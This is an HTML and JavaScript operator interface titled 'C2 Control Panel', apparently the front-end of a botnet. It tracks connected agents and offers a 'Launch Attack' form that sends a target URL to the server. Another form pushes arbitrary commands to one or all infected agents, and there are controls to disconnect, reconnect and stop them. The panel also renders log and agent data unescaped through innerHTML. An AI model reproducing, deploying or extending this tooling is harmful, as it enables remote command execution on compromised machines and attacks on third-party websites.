<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>C2 Control Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #0d0d0d;
      color: #f5f5f5;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .navbar {
      margin-bottom: 20px;
      border-bottom: 1px solid #333;
    }
    .card {
      margin-bottom: 20px;
      background: linear-gradient(145deg, #1c1c1c, #111);
      border: none;
      border-radius: 16px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.6);
    }
    .card-header {
      border-bottom: 1px solid #333;
      font-weight: 600;
      font-size: 1.1rem;
      color: #fff;
    }
    pre {
      background: #111;
      color: #0f0;
      padding: 15px;
      border-radius: 12px;
      max-height: 400px;
      overflow-y: auto;
    }
    .table {
      color: #f0f0f0;
    }
    .badge {
      font-size: 0.85rem;
    }
    button, .btn {
      border-radius: 12px !important;
    }
    /* alert box */
    #alert-box {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 2000;
      display: none;
      min-width: 300px;
    }
    /* loading spinner */
    .spinner-border-sm {
      width: 1rem;
      height: 1rem;
    }
    /* status indicators */
    .status-active { color: #28a745; }
    .status-inactive { color: #ffc107; }
    .status-disabled { color: #dc3545; }
    .status-executing { color: #17a2b8; }
    .status-idle { color: #6c757d; }
    
    /* log entries */
    .log-entry {
      border-left: 3px solid #333;
      padding-left: 10px;
      margin-bottom: 8px;
      font-size: 0.9rem;
    }
    .log-success { border-left-color: #28a745; }
    .log-error { border-left-color: #dc3545; }
    .log-warning { border-left-color: #ffc107; }
    .log-info { border-left-color: #17a2b8; }
    
    /* log timestamp */
    .log-timestamp {
      color: #6c757d;
      font-size: 0.8rem;
    }
    
    /* log message types */
    .log-type-attack { background: rgba(220, 53, 69, 0.1); }
    .log-type-send { background: rgba(23, 162, 184, 0.1); }
    .log-type-stop_all { background: rgba(255, 193, 7, 0.1); }
    .log-type-disconnect { background: rgba(220, 53, 69, 0.1); }
    .log-type-reconnect { background: rgba(40, 167, 69, 0.1); }
  </style>
</head>
<body>
  <nav class="navbar navbar-dark bg-black px-3">
    <span class="navbar-brand mb-0 h1">💻 C2 Control Panel
      <span id="bot-count" class="badge bg-success">0</span>
      <span id="disabled-count" class="badge bg-danger">0</span>
    </span>
    <div>
      <button class="btn btn-warning btn-sm me-2" onclick="stopAll()">🛑 Stop All</button>
      <button class="btn btn-info btn-sm me-2" onclick="reconnectAll()">🔄 Reconnect All</button>
      <a href="/logout" class="btn btn-outline-light btn-sm">Logout</a>
    </div>
  </nav>

  <!-- alert box -->
  <div id="alert-box" class="alert text-dark fw-bold py-2 px-4 rounded shadow"></div>

  <div class="container">
    <!-- Agent list -->
    <div class="card">
      <div class="card-header">📡 Active Agents</div>
      <div class="card-body">
        <table class="table table-dark table-hover" id="agent-table">
          <thead>
            <tr>
              <th>Agent ID</th>
              <th>Last Seen</th>
              <th>Status</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody id="agent-list"></tbody>
        </table>
        <div class="d-flex gap-2">
          <button class="btn btn-outline-danger" onclick="disconnectAll()">❌ Disconnect All</button>
          <button class="btn btn-outline-success" onclick="reconnectAll()">🔄 Reconnect All</button>
        </div>
      </div>
    </div>

    <!-- Attack -->
    <div class="card">
      <div class="card-header">⚔️ Attack</div>
      <div class="card-body">
        <form id="attack-form" class="d-flex gap-2">
          <input type="text" id="attack-url" name="url" class="form-control" placeholder="https://example.com" required>
          <button type="submit" class="btn btn-danger" id="attack-btn">
            🔥 Launch Attack
          </button>
        </form>
      </div>
    </div>

    <!-- Command Section -->
    <div class="card">
      <div class="card-header">💻 Send Command</div>
      <div class="card-body">
        <form id="command-form" class="mb-3">
          <div class="row">
            <div class="col-md-3">
              <select id="target-agent" class="form-select">
                <option value="all">All Agents</option>
              </select>
            </div>
            <div class="col-md-7">
              <input type="text" id="command-input" class="form-control" placeholder="Enter command..." required>
            </div>
            <div class="col-md-2">
              <button type="submit" class="btn btn-primary w-100" id="command-btn">
                Send
              </button>
            </div>
          </div>
        </form>
      </div>
    </div>

    <!-- Logs -->
    <div class="card">
      <div class="card-header">📋 Activity Logs</div>
      <div class="card-body">
        <div id="logs-container" style="max-height: 500px; overflow-y: auto;">
          <!-- Logs will be populated here -->
        </div>
        <div class="mt-2 d-flex gap-2">
          <button class="btn btn-outline-secondary btn-sm" onclick="refreshLogs()">🔄 Refresh</button>
          <button class="btn btn-outline-warning btn-sm" onclick="clearLogs()">🗑️ Clear Logs</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    let lastLogCount = 0;

    function showAlert(message, type="success") {
      const alertBox = document.getElementById("alert-box");
      alertBox.className = `alert alert-${type} text-dark fw-bold py-2 px-4 rounded shadow`;
      alertBox.innerText = message;
      alertBox.style.display = "block";
      setTimeout(() => {
        alertBox.style.display = "none";
      }, 4000);
    }

    function setButtonLoading(buttonId, loading) {
      const btn = document.getElementById(buttonId);
      if (loading) {
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Loading...';
      } else {
        btn.disabled = false;
        // Reset to original text based on button ID
        if (buttonId === 'attack-btn') {
          btn.innerHTML = '🔥 Launch Attack';
        } else if (buttonId === 'command-btn') {
          btn.innerHTML = 'Send';
        }
      }
    }

    async function fetchAgents() {
      try {
        const res = await fetch("/agents");
        const agents = await res.json();
        const tbody = document.getElementById("agent-list");
        const targetSelect = document.getElementById("target-agent");
        
        tbody.innerHTML = "";
        // Clear and repopulate target select
        targetSelect.innerHTML = '<option value="all">All Agents</option>';
        
        agents.forEach(agent => {
          const tr = document.createElement("tr");
          tr.setAttribute("id", `agent-${agent.id}`);
          
          let statusClass = 'status-' + agent.status;
          let statusIcon = '';
          switch(agent.status) {
            case 'active': statusIcon = '🟢'; break;
            case 'inactive': statusIcon = '🟡'; break;
            case 'disabled': statusIcon = '🔴'; break;
            case 'executing': statusIcon = '🔵'; break;
            case 'idle': statusIcon = '⚪'; break;
            default: statusIcon = '⚫';
          }
          
          tr.innerHTML = `
            <td>${agent.id}</td>
            <td>${agent.last_seen}<br><small class="text-muted">${agent.time_diff || ''}</small></td>
            <td>
              <span class="${statusClass}">
                ${statusIcon} ${agent.status}
              </span>
            </td>
            <td>
              ${agent.status === 'disabled' ? 
                `<button class="btn btn-sm btn-success me-1" onclick="reconnectAgent('${agent.id}')">🔄 Reconnect</button>` :
                `<button class="btn btn-sm btn-danger me-1" onclick="disconnectAgent('${agent.id}')">❌ Disconnect</button>`
              }
            </td>
          `;
          tbody.appendChild(tr);
          
          // Add to target select if not disabled
          if (agent.status !== 'disabled') {
            const option = document.createElement('option');
            option.value = agent.id;
            option.textContent = agent.id;
            targetSelect.appendChild(option);
          }
        });
        
        const activeCount = agents.filter(a => a.status === 'active').length;
        const disabledCount = agents.filter(a => a.status === 'disabled').length;
        
        document.getElementById("bot-count").innerText = activeCount;
        document.getElementById("disabled-count").innerText = disabledCount;
        
      } catch (error) {
        console.error('Error fetching agents:', error);
        showAlert("Failed to fetch agents", "danger");
      }
    }

    async function fetchLogs() {
      try {
        const res = await fetch("/logs");
        if (res.ok) {
          const logs = await res.json();
          displayLogs(logs);
        }
      } catch (error) {
        console.error('Error fetching logs:', error);
      }
    }

    function displayLogs(logs) {
      const container = document.getElementById("logs-container");
      container.innerHTML = "";
      
      logs.slice(0, 100).forEach(log => {
        const logDiv = document.createElement("div");
        logDiv.className = `log-entry log-${log.status || 'info'} log-type-${log.type} p-2 mb-1 rounded`;
        
        let icon = '';
        switch(log.type) {
          case 'attack': icon = '⚔️'; break;
          case 'send': icon = '💻'; break;
          case 'stop_all': icon = '🛑'; break;
          case 'disconnect': icon = '❌'; break;
          case 'reconnect': icon = '🔄'; break;
          case 'register': icon = '📡'; break;
          case 'result': icon = '📊'; break;
          case 'agent_log': icon = '📝'; break;
          default: icon = 'ℹ️';
        }
        
        logDiv.innerHTML = `
          <div class="d-flex justify-content-between">
            <span>${icon} <strong>${log.type.toUpperCase()}</strong></span>
            <span class="log-timestamp">${log.timestamp || new Date(log.ts * 1000).toLocaleString()}</span>
          </div>
          <div class="mt-1">${log.message}</div>
          ${log.agent ? `<small class="text-muted">Agent: ${log.agent}</small>` : ''}
          ${log.cmd ? `<small class="text-muted d-block">Command: ${log.cmd.substring(0, 80)}${log.cmd.length > 80 ? '...' : ''}</small>` : ''}
        `;
        
        container.appendChild(logDiv);
      });
      
      // Auto scroll to top for new logs
      container.scrollTop = 0;
    }

    async function disconnectAgent(agentId) {
      try {
        const res = await fetch(`/disconnect/${agentId}`, { method: "POST" });
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert(data.msg, "success");
          fetchAgents();
          fetchLogs();
        } else {
          showAlert(data.msg || "Failed to disconnect agent", "danger");
        }
      } catch (error) {
        showAlert("Network error while disconnecting agent", "danger");
      }
    }

    async function reconnectAgent(agentId) {
      try {
        const res = await fetch(`/reconnect/${agentId}`, { method: "POST" });
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert(data.msg, "success");
          fetchAgents();
          fetchLogs();
        } else {
          showAlert(data.msg || "Failed to reconnect agent", "danger");
        }
      } catch (error) {
        showAlert("Network error while reconnecting agent", "danger");
      }
    }

    async function disconnectAll() {
      try {
        const res = await fetch(`/disconnect_all`, { method: "POST" });
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert(data.msg, "success");
          fetchAgents();
          fetchLogs();
        } else {
          showAlert(data.msg || "Failed to disconnect all agents", "danger");
        }
      } catch (error) {
        showAlert("Network error while disconnecting all agents", "danger");
      }
    }

    async function reconnectAll() {
      try {
        const res = await fetch(`/reconnect_all`, { method: "POST" });
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert(data.msg, "success");
          fetchAgents();
          fetchLogs();
        } else {
          showAlert(data.msg || "Failed to reconnect agents", "danger");
        }
      } catch (error) {
        showAlert("Network error while reconnecting agents", "danger");
      }
    }

    async function stopAll() {
      try {
        const res = await fetch(`/stop_all`, { method: "POST" });
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert(data.msg, "success");
          fetchAgents();
          fetchLogs();
        } else {
          showAlert(data.msg || "Failed to stop all agents", "danger");
        }
      } catch (error) {
        showAlert("Network error while stopping all agents", "danger");
      }
    }

    async function refreshLogs() {
      try {
        await fetchLogs();
        showAlert("Logs refreshed", "info");
      } catch (error) {
        showAlert("Failed to refresh logs", "danger");
      }
    }

    async function clearLogs() {
      if (!confirm("Are you sure you want to clear all logs?")) {
        return;
      }
      
      try {
        const res = await fetch('/clear_logs', { method: 'POST' });
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert("Logs cleared", "success");
          fetchLogs();
        } else {
          showAlert("Failed to clear logs", "danger");
        }
      } catch (error) {
        showAlert("Network error while clearing logs", "danger");
      }
    }

    // Attack form handler
    document.getElementById("attack-form").addEventListener("submit", async (e) => {
      e.preventDefault();
      const url = document.getElementById("attack-url").value.trim();
      
      if (!url) {
        showAlert("Please enter a valid URL", "warning");
        return;
      }

      setButtonLoading("attack-btn", true);
      
      try {
        const res = await fetch("/attack", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url })
        });
        
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert(data.message, "success");
          document.getElementById("attack-url").value = "";
          fetchAgents();
          fetchLogs();
        } else {
          showAlert(data.message || "Attack failed", "danger");
        }
      } catch (error) {
        showAlert("Network error during attack", "danger");
      } finally {
        setButtonLoading("attack-btn", false);
      }
    });

    // Command form handler
    document.getElementById("command-form").addEventListener("submit", async (e) => {
      e.preventDefault();
      const agent = document.getElementById("target-agent").value;
      const cmd = document.getElementById("command-input").value.trim();
      
      if (!cmd) {
        showAlert("Please enter a command", "warning");
        return;
      }

      setButtonLoading("command-btn", true);
      
      try {
        const res = await fetch("/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ agent, cmd })
        });
        
        const data = await res.json();
        
        if (data.status === 'success') {
          showAlert(data.message, "success");
          document.getElementById("command-input").value = "";
          fetchAgents();
          fetchLogs();
        } else {
          showAlert(data.message || "Command failed", "danger");
        }
      } catch (error) {
        showAlert("Network error sending command", "danger");
      } finally {
        setButtonLoading("command-btn", false);
      }
    });

    // Auto-refresh agents every 3 seconds
    setInterval(fetchAgents, 3000);
    
    // Auto-refresh logs every 5 seconds
    setInterval(fetchLogs, 5000);
    
    // Initial load
    fetchAgents();
    fetchLogs();
  </script>
</body>
</html>